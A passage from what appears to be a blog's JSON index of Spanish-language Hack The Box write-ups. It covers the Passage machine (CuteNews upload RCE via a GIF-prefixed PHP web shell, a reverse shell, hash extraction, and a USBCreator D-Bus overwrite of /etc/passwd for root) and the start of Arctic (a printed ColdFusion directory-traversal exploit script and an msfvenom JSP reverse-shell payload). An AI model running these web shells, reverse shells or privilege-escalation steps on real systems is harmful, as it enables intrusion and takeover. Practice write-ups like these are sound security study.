nil, nil, 'form-data; name= mod ')  pdata. add_part('personal', nil, nil, 'form-data; name= opt ')  pdata. add_part( #{signkey} , nil, nil, 'form-data; name= __signature_key ')  pdata. add_part( #{signdsi} , nil, nil, 'form-data; name= __signature_dsi ')  pdata. add_part('', nil, nil, 'form-data; name= editpassword ')  pdata. add_part('', nil, nil, 'form-data; name= confirmpassword ')  pdata. add_part( #{datastore['USERNAME']} , nil, nil, 'form-data; name= editnickname ')  pdata. add_part( GIF\r\n  + payload. encoded, 'image/png', nil,  form-data; name=\ avatar_file\ ; filename=\ #{fname}\  )  pdata. add_part('', nil, nil, 'form-data; name= more[site] ')  pdata. add_part('', nil, nil, 'form-data; name= more[about] ')  data = pdata. to_sPuedes ver este articulo, para comprender a mayor detalle el uso de Magic Numbers  List-of-file-signaturesComo ya sabemos en que consiste la vulnerabilidad, en vez de hacer uso del exploit. Crearemos un archivo php con esas caracteristicas, que nos permita la ejecución de comandos mediante el uso de un parametro definido cmd en conjunto con la función shell_exec. Seguidamente subiremos el archivo. ❯ cat cmd. phpGIF8;&lt;?php  echo  &lt;pre&gt;  . shell_exec($_REQUEST['cmd']) .  &lt;/pre&gt; ;?&gt; El archivo se sube correctamente y consecuentemente inspeccionamos la ruta en donde se encuentra nuestro archivo.  Vamos a la ruta indicada de nombre uploads y si vemos nuestro archivo subido.  Verificamos que podemos ejecutar comandos y estamos como www-data Lo que sigue sera mandarnos una reverse shell a nuestra maquina haciendo uso bash y poniendonos en escucha con ncat  Recordatorio no olvidar urlencodear el caracter &amp; a %26 para evitar problemas al procesarse la petición. Enviamos la petición y recibimos la conexión como el usuario www-data. ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 206. Ncat: Connection from 10. 10. 10. 206:43080. bash: cannot set terminal process group (1683): Inappropriate ioctl for devicebash: no job control in this shellwww-data@passage:/var/www/html/CuteNews/uploads$ whoamiwhoamiwww-dataComo es de costumbre, vamos a obtener una tty full interactiva con los comandos de siempre. www-data@passage:/var/www/html/CuteNews/uploads$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/nullwww-data@passage:/var/www/html/CuteNews/uploads$ ^Zzsh: suspended ncat -nlvp 443❯ stty raw -echo; fg[1] + continued ncat -nlvp 443                reset xtermwww-data@passage:/var/www/html/CuteNews/uploads$ export TERM=xtermwww-data@passage:/var/www/html/CuteNews/uploads$ export SHELL=bashwww-data@passage:/var/www/html/CuteNews/uploads$ stty rows 45 columns 174 Cabe recordar que el numero de rows y columns corresponden a las dimensiones de tu pantalla y puedes verificar haciendo uso del comando stty size Existe un repositorio de CuteNews publico en github:  Cutenews-2. 0Aqui nos habla que para agregar comentarios, perfiles o cualquier información, no necesita hacer uso de un gestor de base de datos como mysql. Revisando el repositorio podemos ver que la data lo almacena en un directorio de nombre cdata. www-data@passage:/var/www/html/CuteNews/cdata$ ls Default. tpl	  backup	 category. db. php confirmations. php idnews. db. php  news	 postponed_news. txt template		 users. txtHeadlines. tpl	  btree	 comments. txt	 csrf. php	   installed. mark news. txt	 replaces. php	   unapproved_news. txtarchives	  cache	 conf. php	 flood. db. php    ipban. db. php  newsid. txt rss. tpl	   usersauto_archive. db. php cat. num. php config. php	 flood. txt	   log	   plugins	 rss_config. php   users. db. phpDentro de este directorio en el directorio users, almacena los datos de los usuarios registrados en un archivo cuyo nombre se computa al tomar los dos primeros caracteres del usuario en md5 y le agrega la extensión php. Como yo cree el usuario fmiracle, los primeros caracteres corresponderian a cb ❯ echo -n  fmiracle  | md5sumcb151a66aabded3ee89f616afab7b6c9Vemos que si existe un archivo cb. php en el directorio asi que procedemos a leerlo www-data@passage:/var/www/html/CuteNews/cdata/users$ cat cb. php &lt;?php die('Direct call - access denied'); ?&gt;YToxOntzOjQ6Im5hbWUiO2E6MTp7czo4OiJmbWlyYWNsZSI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjgxNzUwODAyIjtzOjQ6Im5hbWUiO3M6ODoiZm1pcmFjbGUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MjE6ImZtaXJhY2xlQGZtaXJhY2xlLmNvbSI7czo0OiJuaWNrIjtzOjg6ImZtaXJhY2xlIjtzOjQ6InBhc3MiO3M6NjQ6IjQ4Yjg0MWJlYTIwNWZkYjJkNjAxNDBhODljOGIzMDA2MThmYWNhMjAwZDI2YmQyY2Q0YmQyYzBmNTk4MTgzODMiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czoyMzoiYXZhdGFyX2ZtaXJhY2xlX2NtZC5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19www-dYa que el formato esta en base64 usaremos un base64 -d para decodificarla y vemos el hash correspondiente a la contraseña. www-data@passage:/var/www/html/CuteNews/cdata/users$ echo  YToxOntzOjQ6Im5hbWUiO2E6MTp7czo4OiJmbWlyYWNsZSI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjgxNzUwODAyIjtzOjQ6Im5hbWUiO3M6ODoiZm1pcmFjbGUi3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MjE6ImZtaXJhY2xlQGZtaXJhY2xlLmNvbSI7czo0OiJuaWNrIjtzOjg6ImZtaXJhY2xlIjtzOjQ6InBhc3MiO3M6NjQ6IjQ4Yjg0MWJlYTIwNWZkYjJkNjAxNDBhODljOGIzMDA2MThmWNhMjAwZDI2YmQyY2Q0YmQyYzBmNTk4MTgzODMiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czoyMzoiYXZhdGFyX2ZtXJhY2xlX2NtZC5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19www-data@passage  | base64 -d; echoa:1:{s:4: name ;a:1:{s:8: fmiracle ;a:9:{s:2: id ;s:10: 1681750802 ;s:4: name ;s:8: fmiracle ;s:3: acl ;s:1: 4 ;s:5: email ;s:21: fmiracle@fmiracle. com ;s:4: nick ;s:8: fmiracle ;s:4: pass ;s:64: 48b841bea205fdb2d60140a89c8b300618faca200d26bd2cd4bd2c0f59818383 ;s:4: more ;s:60: YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ== ;s:6: avatar ;s:23: avatar_fmiracle_cmd. php ;s:6: e-hide ;s:0:  ;}}}                     base64: invalid inputVamos a realizar el mismo proceso para todos los archivos y visualizaremos los hashes correspondientes a los usuarios registrados. www-data@passage:/var/www/html/CuteNews/cdata/users$ cat * | grep -v  denied  | base64 -d; echoa:1:{s:5: email ;a:1:{s:16: paul@passage. htb ;s:10: paul-coles ;}}a:1:{s:2: id ;a:1:{i:1598829833;s:6: egre55 ;}}a:1:{s:5: email ;a:1:{s:15: egre55@test. com ;s:6: egre55 ;}}a:1:{s:4: name ;a:1:{s:5: admin ;a:8:{s:2: id ;s:10: 1592483047 ;s:4: name ;s:5: admin ;s:3: acl ;s:1: 1 ;s:5: email ;s:17: nadav@passage. htb ;s:4: pass ;s:64: 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 ;s:3: lts ;s:10: 1592487988 ;s:3: ban ;s:1: 0 ;s:3: cnt ;s:1: 2 ;}}}a:1:{s:2: id ;a:1:{i:1592483281;s:9: sid-meier ;}}a:1:{s:5: email ;a:1:{s:17: nadav@passage. htb ;s:5: admin ;}}a:1:{s:5: email ;a:1:{s:15: kim@example. com ;s:9: kim-swift ;}}a:1:{s:2: id ;a:1:{i:1592483236;s:10: paul-coles ;}}a:1:{s:4: name ;a:1:{s:9: sid-meier ;a:9:{s:2: id ;s:10: 1592483281 ;s:4: name ;s:9: sid-meier ;s:3: acl ;s:1: 3 ;s:5: email ;s:15: sid@example. com ;s:4: nick ;s:9: Sid Meier ;s:4: pass ;s:64: 4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88 ;s:3: lts ;s:10: 1592485645 ;s:3: ban ;s:1: 0 ;s:3: cnt ;s:1: 2 ;}}}a:1:{s:2: id ;a:1:{i:1592483047;s:5: admin ;}}a:1:{s:5: email ;a:1:{s:15: sid@example. com ;s:9: sid-meier ;}}a:1:{s:4: name ;a:1:{s:10: paul-coles ;a:9:{s:2: id ;s:10: 1592483236 ;s:4: name ;s:10: paul-coles ;s:3: acl ;s:1: 2 ;s:5: email ;s:16: paul@passage. htb ;s:4: nick ;s:10: Paul Coles ;s:4: pass ;s:64: e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd ;s:3: lts ;s:10: 1592485556 ;s:3: ban ;s:1: 0 ;s:3: cnt ;s:1: 2 ;}}}a:1:{s:4: name ;a:1:{s:9: kim-swift ;a:9:{s:2: id ;s:10: 1592483309 ;s:4: name ;s:9: kim-swift ;s:3: acl ;s:1: 3 ;s:5: email ;s:15: kim@example. com ;s:4: nick ;s:9: Kim Swift ;s:4: pass ;s:64: f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca ;s:3: lts ;s:10: 1592487096 ;s:3: ban ;s:1: 0 ;s:3: cnt ;s:1: 3 ;}}}a:1:{s:4: name ;a:1:{s:6: egre55 ;a:11:{s:2: id ;s:10: 1598829833 ;s:4: name ;s:6: egre55 ;s:3: acl ;s:1: 4 ;s:5: email ;s:15: egre55@test. com ;s:4: nick ;s:6: egre55 ;s:4: pass ;s:64: 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc ;s:4: more ;s:60: YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ== ;s:3: lts ;s:10: 1598834079 ;s:3: ban ;s:1: 0 ;s:6: avatar ;s:26: avatar_egre55_spwvgujw. php ;s:6: e-hide ;s:0:  ;}}}a:1:{s:2: id ;a:1:{i:1592483309;s:9: kim-swift ;}}De los hashes obtenidos procederemos a crackearlos en nuestra web de confianza.  https://crackstation. net/Logramos obtener unas contraseñas en texto claro.  Ahora intentaremos logearnos con algunos de los usuarios del sistema, haciendo uso de las contraseñas que obtuvimos y conseguimos logearnos como el usuario paul. Podemos ir a su directorio de trabajo y visualizar la primera flag user. txt www-data@passage:/var/www/html/CuteNews/cdata/users$ su paulPassword: paul@passage:/var/www/html/CuteNews/cdata/users$ cd /home/paul/paul@passage:~$ cat user. txt 9914c80b41f867472dd68c1e54c77609Escalada de Privilegios #: Enumerando al usuario paul, encontramos que tenemos un directorio oculto . ssh. paul@passage:~$ ls -latotal 112drwxr-x--- 16 paul paul 4096 Sep 2 2020 . drwxr-xr-x 4 root root 4096 Jul 21 2020 . . ---------- 1 paul paul  0 Jul 21 2020 . bash_history-rw-r--r-- 1 paul paul 220 Aug 31 2015 . bash_logout-rw-r--r-- 1 paul paul 3770 Jul 21 2020 . bashrcdrwx------ 10 paul paul 4096 Sep 1 2020 . cachedrwx------ 14 paul paul 4096 Aug 24 2020 . configdrwxr-xr-x 2 paul paul 4096 Jul 21 2020 Desktop-rw-r--r-- 1 paul paul  25 Aug 24 2020 . dmrcdrwxr-xr-x 2 paul paul 4096 Jul 21 2020 Documentsdrwxr-xr-x 2 paul paul 4096 Jul 21 2020 Downloads-rw-r--r-- 1 paul paul 8980 Apr 20 2016 examples. desktopdrwx------ 2 paul paul 4096 Aug 24 2020 . gconfdrwx------ 3 paul paul 4096 Sep 2 2020 . gnupg-rw------- 1 paul paul 1292 Sep 2 2020 . ICEauthoritydrwx------ 3 paul paul 4096 Aug 24 2020 . localdrwxr-xr-x 2 paul paul 4096 Jul 21 2020 Musicdrwxr-xr-x 2 paul paul 4096 Jul 21 2020 Pictures-rw-r--r-- 1 paul paul 655 May 16 2017 . profiledrwxr-xr-x 2 paul paul 4096 Jul 21 2020 Publicdrwxr-xr-x 2 paul paul 4096 Jul 21 2020 . sshdrwxr-xr-x 2 paul paul 4096 Jul 21 2020 Templates-r-------- 1 paul paul  33 Apr 17 09:08 user. txtdrwxr-xr-x 2 paul paul 4096 Jul 21 2020 Videos-rw------- 1 paul paul  52 Sep 2 2020 . Xauthority-rw------- 1 paul paul 1228 Sep 2 2020 . xsession-errors-rw------- 1 paul paul 1397 Sep 1 2020 . xsession-errors. oldDentro del directorio podemos visualizar una clave authorized_keys, que pertenece al usuario nadav paul@passage:~/. ssh$ lsauthorized_keys id_rsa id_rsa. pub known_hostspaul@passage:~/. ssh$ cat authorized_keysssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passagePor principios basicos de claves ssh al tener la clave publica del usuario nadav, puedo conectarme como a la propia maquina sin proporcionar contraseña. paul@passage:~/. ssh$ ssh nadav@127. 0. 0. 1The authenticity of host '127. 0. 0. 1 (127. 0. 0. 1)' can't be established. ECDSA key fingerprint is SHA256:oRyj2rNWOCrVh9SCgFGamjppmxqJUlGgvI4JSVG75xg. Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '127. 0. 0. 1' (ECDSA) to the list of known hosts. Last login: Mon Aug 31 15:07:54 2020 from 127. 0. 0. 1nadav@passage:~$ whoaminadavAhora que somos el usuario nadav, listamos los recursos de su directorio personal y tratando de leer los archivos ocultos, vemos el contenido del archivo viminfo, el cual hace bastante mención a un archivo USBCreator. nadav@passage:~$ cat . viminfo # This viminfo file was generated by Vim 7. 4. # You may edit it if you're careful!# Value of 'encoding' when this file was written*encoding=utf-8# hlsearch on (H) or off (h):~h# Last Substitute Search Pattern:~MSle0~&amp;AdminIdentities=unix-group:root# Last Substitute String:$AdminIdentities=unix-group:sudo# Command Line History (newest to oldest)::wq:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g# Search String History (newest to oldest):? AdminIdentities=unix-group:root# Expression History (newest to oldest):# Input Line History (newest to oldest):# Input Line History (newest to oldest):# Registers:# File marks:'0 12 7 /etc/dbus-1/system. d/com. ubuntu. USBCreator. conf'1 2 0 /etc/polkit-1/localauthority. conf. d/51-ubuntu-admin. conf# Jumplist (newest first):-' 12 7 /etc/dbus-1/system. d/com. ubuntu. USBCreator. conf-' 1 0 /etc/dbus-1/system. d/com. ubuntu. USBCreator. conf-' 2 0 /etc/polkit-1/localauthority. conf. d/51-ubuntu-admin. conf-' 1 0 /etc/polkit-1/localauthority. conf. d/51-ubuntu-admin. conf-' 2 0 /etc/polkit-1/localauthority. conf. d/51-ubuntu-admin. conf-' 1 0 /etc/polkit-1/localauthority. conf. d/51-ubuntu-admin. conf# History of marks within files (newest to oldest):&gt; /etc/dbus-1/system. d/com. ubuntu. USBCreator. conf	 	12	7&gt; /etc/polkit-1/localauthority. conf. d/51-ubuntu-admin. conf	 	2	0	. 	2	0	+	2	0Como hace mucha referencia a el archivo USBCreator, vamos a proceder a buscar si exiten vulnerabilidades asociadas y concretamente entramos una relacionada a Privilege Escalataion Aqui el articulo para mayor detalle:  Usbcreator-d-bus-privilege-escalationEn resumen la vulnerabilidad aprovecha una cierta capacidad de sobrescritura de los permisos de un archivo usando el comando gdbus, cambiandolos por los del usuario privilegiado root. Podemos aprovecharnos de esta vulnerabilidad de muchas maneras. Concretamente en este caso primero realizaremos una copia del /etc/passwd de la maquina y lo modificaremos agregando una contraseña que vamos a computar con openssl al usuario root. Y una vez tengamos el archivo modificado aprovecharemos de esta vulnerabilidad para sobrescribir el archivo original del /etc/passwd con el nuevo que tenemos, de modo que al haberle cambiado la contraseña a root podamos convertirnos en el con la contraeñas que le indicamos. Vamos a hacerlo paso a paso para que se entienda: Primero nos copias el /etc/passwd para evitar problemas de permisos lo haremos en la ruta tmp nadav@passage:/tmp$ cp /etc/passwd . nadav@passage:/tmp$ lsconfig-err-QHQCht                            systemd-private-70af303641bf4fb2935fb9f554b4ff23-fwupd. service-rSKHgW       unity_support_test. 0passwd                                 systemd-private-70af303641bf4fb2935fb9f554b4ff23-rtkit-daemon. service-1jCj09    VMwareDnDsystemd-private-70af303641bf4fb2935fb9f554b4ff23-colord. service-h1Z4SP systemd-private-70af303641bf4fb2935fb9f554b4ff23-systemd-timesyncd. service-zchybP vmware-rootUna vez tenemos el passwd, vamos a crearnos una contraseña, la cual tiene que estar en formato desk unix. Eso lo hacemos con openssl passwd, el cual nos pedira una contraseña. En este caso le pondre algo simple como la palabra hola, pero se puede poner cualquier cosa. nadav@passage:/tmp$ openssl passwdPassword: Verifying - Password: POoz1bD1QhbD. Seguidamente debemos modifcar el passwd y en root. Para esto reeemplazamos la x por nuestra contraseña. nadav@passage:/tmp$ cat passwd root:POoz1bD1QhbD. :0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologDespues tal y como nos dice la vulnerabilidad, usamos el comando gdbuss tal cual los parametros mencionados y le indicamos primero nuestro archivo /tmp/passwdy seguido la ruta original donde lo sobreescribiremos /etc/passwd finalmente el parametro true nadav@passage:/tmp$ gdbus call --system --dest com. ubuntu. USBCreator --object-path /com/ubuntu/USBCreator --method com. ubuntu. USBCreator. Image /tmp/passwd /etc/passwd true()Ahora proceremos a leer el archivo /etc/passwd. nadav@passage:/tmp$ cat /etc/passwdroot:POoz1bD1QhbD. :0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinVemos que efectivamente lo modificamos la contraseña del usuario root. Lo que nos queda ahora es migrar al usuario root, dirigirnos a su directorio personal y visualizar la segunda flag root. txt. nadav@passage:/tmp$ su rootPassword: root@passage:/tmp# cd /rootroot@passage:~# cat root. txt36b5bcee8e0d7f4be426e8016250dd7froot@passage:~#Esto seria todo por esta ocasión 😄 "
    }, {
    "id": 37,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Arctic",
    "title": "Maquina Arctic - htb writeup",
    "body": "2023/04/11 - El dia de hoy vamos a estar resolviendo la maquina Arctic de hackthebox que es una maquina Windows de dificultad Facil. Para explotar esta maquina abusaremos una vulnerabilidad de Adobe Coldfusion 8 que nos permitira realizar un directory path traversal y una vez conectados al Coldfusion nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo jsp malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario administrator nos aprovecharemos del privilegio Seimpersonateprivilege. Vamos a comenzar como siempre creando un directorio con el nombre de la maquina: ❯ mkdir Arctic❯ ls Arctic❯ which mktmkt () {	mkdir {nmap,content,scripts}}❯ mkt❯ ls content  exploits  nmapEnumeración #: Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 11PING 10. 10. 10. 11 (10. 10. 10. 11) 56(84) bytes of data. 64 bytes from 10. 10. 10. 11: icmp_seq=1 ttl=127 time=168 ms--- 10. 10. 10. 11 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 167. 800/167. 800/167. 800/0. 000 msVemos que la maquina nos responde con un ttl de 127 correspondiente a una maquina windows, ahora procederemos a el scaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre allPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 11 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-04-11 15:49 GMTInitiating SYN Stealth Scan at 15:49Scanning 10. 10. 10. 11 [65535 ports]Discovered open port 135/tcp on 10. 10. 10. 11Discovered open port 49154/tcp on 10. 10. 10. 11Discovered open port 8500/tcp on 10. 10. 10. 11Completed SYN Stealth Scan at 15:49, 26. 54s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 11Host is up, received user-set (0. 13s latency). Scanned at 2023-04-11 15:49:10 GMT for 27sNot shown: 65532 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON135/tcp  open msrpc  syn-ack ttl 1278500/tcp open fmtp  syn-ack ttl 12749154/tcp open unknown syn-ack ttl 127Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 26. 67 seconds      Raw packets sent: 131085 (5. 768MB) | Rcvd: 19 (836B)Podemos ver puertos interesantes que se encuentran abiertos como 135 rpc , 8500 fmtp , 445 smb y 49154 unknown - desconocido. Escaneo de Version y Servicios. : ❯ nmap -sCV -p 135,8500,49154 10. 10. 10. 11 -oN targetsStarting Nmap 7. 92 ( https://nmap. org ) at 2023-04-11 15:51 GMTNmap scan report for 10. 10. 10. 11Host is up (0. 29s latency). PORT   STATE SERVICE VERSION135/tcp  open msrpc  Microsoft Windows RPC8500/tcp open fmtp?49154/tcp open msrpc  Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 147. 62 secondsVisulizamos la versión de los puertos escaneados:       Puerto   Servicio   Versión         135   MSRPC   Microsoft Windows RPC       8500   FMTP?           49154   MSRPC   Microsoft Windows RPC   Explotación #: Primero ya que nmap no detecto el servicio del puerto 8500 en vista que nos pregunta si es fmtp?, puede tratarse de un servicio web, pero como tarda en responder al no encontrar nada no tiene claro el servicio. Vamos al navegador y veamos si el servicio es http, nos tarda un poco pero efectivamente si es un servicio web.  Dentro del dicrectorio CFIDE vemos nuevos directorios interesantes.  Si ahora vamos al direcotrio administrator, vemos un panel administrativo de Adobe Coldfusion 8 Seguidamente veamos con searchsploit si existen vulnerabilidades asociadas a Adobe coldfusion. ❯ searchsploit adobe coldfusion----------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                    | Path----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Adobe ColdFusion - 'probe. cfm' Cross-Site Scripting                                                 | cfm/webapps/36067. txtAdobe ColdFusion - Directory Traversal                                                        | multiple/remote/14641. pyAdobe ColdFusion - Directory Traversal (Metasploit)                                                 | multiple/remote/16985. rbAdobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)                                  | windows/remote/50781. txtAdobe Coldfusion 11. 0. 03. 292866 - BlazeDS Java Object Deserialization Remote Code Execution                             | windows/remote/43993. pyAdobe ColdFusion 2018 - Arbitrary File Upload                                                    | multiple/webapps/45979. txtAdobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                          | cfm/webapps/29567. txtAdobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                          | cfm/webapps/36172. txtAdobe ColdFusion 8 - Remote Command Execution (RCE)                                                 | cfm/webapps/50057. pyAdobe ColdFusion 9 - Administrative Authentication Bypass                                              | windows/webapps/27755. txtAdobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                        | multiple/remote/30210. rbAdobe ColdFusion &lt; 11 Update 10 - XML External Entity Injection                                           | multiple/webapps/40346. pyAdobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                      | multiple/remote/24946. rbAdobe ColdFusion Server 8. 0. 1 - '/administrator/enter. cfm' Query String Cross-Site Scripting                             | cfm/webapps/33170. txtAdobe ColdFusion Server 8. 0. 1 - '/wizards/common/_authenticatewizarduser. cfm' Query String Cross-Site Scripting                   | cfm/webapps/33167. txtAdobe ColdFusion Server 8. 0. 1 - '/wizards/common/_logintowizard. cfm' Query String Cross-Site Scripting                        | cfm/webapps/33169. txtAdobe ColdFusion Server 8. 0. 1 - 'administrator/logviewer/searchlog. cfm?startRow' Cross-Site Scripting                        | cfm/webapps/33168. txt----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No ResultsVemos que hay varias vulnerabilidades asociadas como una concreta Adobe ColdFusion 8 - Remote Command Execution (RCE), que concretamente nos va a automatizar todo un proceso para ganar acceso a la maquina. Pero en este caso ya que vamos a realizar la explotación manualmente usaremos la asociada con Adobe ColdFusion - Directory Traversal. Pasemos a inspeccionar ese exploit y veamos en que consiste. ❯ searchsploit -x multiple/remote/14641. pyVeamos de que trata el exploit # Working GET request courtesy of carnal0wnage:# http://server/CFIDE/administrator/enter. cfm?locale=. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /ColdFusion8/lib/password. properties%00en## LLsecurity added another admin page filename:  /CFIDE/administrator/enter. cfm #!/usr/bin/python# CVE-2010-2861 - Adobe ColdFusion Unspecified Directory Traversal Vulnerability# detailed information about the exploitation of this vulnerability:# http://www. gnucitizen. org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/# leo 13. 08. 2010import sysimport socketimport re# in case some directories are blockedfilenames = ( /CFIDE/wizards/common/_logintowizard. cfm ,  /CFIDE/administrator/archives/index. cfm ,  /cfide/install. cfm ,  /CFIDE/administrator/entman/index. cfm ,  /CFIDE/administrator/enter. cfm )post =    POST %s HTTP/1. 1Host: %sConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: %dlocale=%%00%s%%00a   def main():  if len(sys. argv) != 4:    print  usage: %s &lt;host&gt; &lt;port&gt; &lt;file_path&gt;  % sys. argv[0]    print  example: %s localhost 80 . . /. . /. . /. . /. . /. . /. . /lib/password. properties  % sys. argv[0]    print  if successful, the file will be printed     return  host = sys. argv[1]  port = sys. argv[2]  path = sys. argv[3]  for f in filenames:    print  ------------------------------     print  trying , f    s = socket. socket(socket. AF_INET, socket. SOCK_STREAM)    s. connect((host, int(port)))    s. send(post % (f, host, len(path) + 14, path))    buf =       while 1:      buf_s = s. recv(1024)      if len(buf_s) == 0:        break      buf += buf_s    m = re. search('&lt;title&gt;(. *)&lt;/title&gt;', buf, re. S)    if m != None:      title = m. groups(0)[0]      print  title from server in %s:  % f      print  ------------------------------       print m. groups(0)[0]      print  ------------------------------ if __name__ == '__main__':  main()Podemos ver que esta realizando una petición a http://server/CFIDE/administrator/enter. cfm?locale=. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /ColdFusion8/lib/password. properties%00en para extraer un archivo local. Hagamos eso entonces y en el navegador agreguemos esa petición.  Efectivamente nos realiza un leak de una contraseña encryptada, asi que vallamos a nuestra web de confianza y tratemos de crackearla.  https://crackstation. net/Logramos obtener la contraseña en texto plano Ahora que ya contamos de credenciales validas admin:happyday, vamos a logearnos en el panel.   Una vez ganes acceso a un coldfusion y estes como un usuario administrador al igual que un wordpress o un joomla, se pueden hacer ciertas cosas, para ganar acceso. Podemos ir a las opciones de schedule task para crear una nueva tarea y a mappings para ver las rutas expuestas. En mappings podemos ver dos rutas expuestas. Siendo una de ellas C:\ColdFusion8\wwwroot\CFIDE, que corresponde a la ruta que podiamos listar al conectarnos a la pagina. Eso quiere decir que si logramos crear un archivo y meterlo en esa ruta, esta claro que deberia cargarse el archivo en esta parte.  Si ahora nos vamos a schedule task, podemos crear una tarea programada le damo un nombre. Y la idea es que en URL podemos emplear un archivo de una fuente que le indiquemos y en File podemos guardar ese contenido en una ruta dada.  Ahora que tipo de archivos podemos emplear para realizar esto: Pues si investigamos un poco acerca de coldfusion vemos que trabajan con archivos asp, jsp o php Asi que vamos a intentar crear un archivo JSP malicioso, para ello usaremos msfvenom ❯ msfvenom -l payloads | grep jsp  java/jsp_shell_bind_tcp                      Listen for a connection and spawn a command shell  java/jsp_shell_reverse_tcp                     Connect back to attacker and spawn a command shellVemos que tenemos un payload para otorgarnos una shell, asi que usaremos este payload java/jsp_shell_reverse_tcp y especificamos nuestra ip de atacante y el puerto en el cual estaremos en escucha que sera el 443. ❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10. 10. 16. 8 LPORT=443 -o reverse. jspPayload size: 1495 bytesSaved as: reverse. jsp❯ ls reverse. jspUna vez tengamos listo el archivo malicioso, vamos a crear la tarea programada. Espeficamos el nombre que queramos de la tarea pwnarctic, en url le indicamos 